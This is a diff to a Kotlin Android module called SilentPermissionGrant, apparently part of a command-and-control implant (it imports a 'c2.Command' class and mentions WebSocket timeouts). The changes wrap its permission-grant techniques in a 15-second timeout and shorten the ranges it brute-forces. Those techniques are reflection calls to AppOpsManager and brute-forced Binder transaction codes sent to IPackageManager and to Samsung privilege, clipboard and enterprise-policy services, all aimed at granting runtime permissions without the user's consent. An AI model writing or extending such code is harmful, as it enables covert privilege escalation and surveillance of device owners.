@@ -13,6 +13,7 @@ import org.synapse.core.c2.Command
 import org.synapse.core.core.SynapseResponse
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
+import kotlinx.coroutines.withTimeoutOrNull
 import java.io.BufferedReader
 import java.io.InputStreamReader
 import java.lang.reflect.Method
@@ -107,6 +108,10 @@ object SilentPermissionGrant {
 
         val allResults = mutableListOf<TechniqueResult>()
         val remainingAtStart = requested.filter { before[it] != true }.toMutableSet()
+
+        // Cap total grant time at 15s to prevent WebSocket timeout.
+        // If timeout hits, return whatever we've granted so far.
+        val timedOut = withTimeoutOrNull(15_000L) {
 
         // ── Technique 1: AppOpsManager.setUidMode via reflection ──────────
         if (remainingAtStart.isNotEmpty()) {
@@ -229,6 +234,11 @@ object SilentPermissionGrant {
             recordNewGrants(context, remainingAtStart, r)
             allResults.add(r)
             Log.d(TAG, "After semclipboard: granted=${r.permsGranted.size}, remaining=${remainingAtStart.size}")
+        }
+
+        } // end withTimeoutOrNull
+        if (timedOut == null) {
+            Log.w(TAG, "=== Silent grant TIMED OUT after 15s — returning partial results ===")
         }
 
         val after = checkPermissionStates(context, requested)
@@ -539,7 +549,7 @@ object SilentPermissionGrant {
         for (perm in permissions) {
             val opStrs = PERM_TO_OPSTR[perm] ?: continue
             for (opStr in opStrs) {
-                for (txCode in 1..80) {
+                for (txCode in 1..8) {
                     val data = Parcel.obtain(); val reply = Parcel.obtain()
                     try {
                         data.writeInterfaceToken(descriptor)
@@ -560,7 +570,7 @@ object SilentPermissionGrant {
                 }
             }
         }
-        result.details["fallback"] = "tried_tx_1_to_80"
+        result.details["fallback"] = "tried_tx_1_to_8"
     }
 
     private fun tryGetOpCodeHardcoded(opStr: String): Int {
@@ -653,8 +663,8 @@ object SilentPermissionGrant {
         result: TechniqueResult
     ) {
         val descriptor = "android.content.pm.IPackageManager"
-        // Try transaction codes in range 60-100 (grantRuntimePermission is late in AIDL)
-        for (txCode in 60..100) {
+        // Try transaction codes in range 60-67 (grantRuntimePermission is late in AIDL)
+        for (txCode in 60..67) {
             for (perm in permissions) {
                 val data = Parcel.obtain(); val reply = Parcel.obtain()
                 try {
@@ -677,7 +687,7 @@ object SilentPermissionGrant {
                 }
             }
         }
-        result.details["fallback"] = "tried_tx_60_to_100"
+        result.details["fallback"] = "tried_tx_60_to_67"
     }
 
     // ═══════════════════════════════════════════════════════════════════════════
@@ -811,9 +821,9 @@ object SilentPermissionGrant {
                 }
             }
         } else {
-            // Fallback: brute force tx 1..30
+            // Fallback: brute force tx 1..5
             result.details["tx_discovery"] = "fallback_range"
-            for (txCode in 1..30) {
+            for (txCode in 1..5) {
                 trySemPrivilegeTx(binder, descriptors, txCode, "TX_$txCode", permissions, pkgName, uid, result)
             }
         }
@@ -922,9 +932,9 @@ object SilentPermissionGrant {
                 }
             }
         } else {
-            // Fallback: try tx 1..40 with various formats
+            // Fallback: try tx 1..5 with various formats
             result.details["tx_discovery"] = "fallback_range"
-            for (txCode in 1..40) {
+            for (txCode in 1..5) {
                 tryAppPolicyTx(binder, descriptors, txCode, "TX_$txCode", permissions, pkgName, uid, result)
             }
         }
@@ -1042,7 +1052,7 @@ object SilentPermissionGrant {
             }
         } else {
             result.details["tx_discovery"] = "fallback_range"
-            for (txCode in 1..40) {
+            for (txCode in 1..5) {
                 tryEnterprisePolicyTx(binder, descriptors, txCode, "TX_$txCode", permissions, pkgName, uid, result)
             }
         }
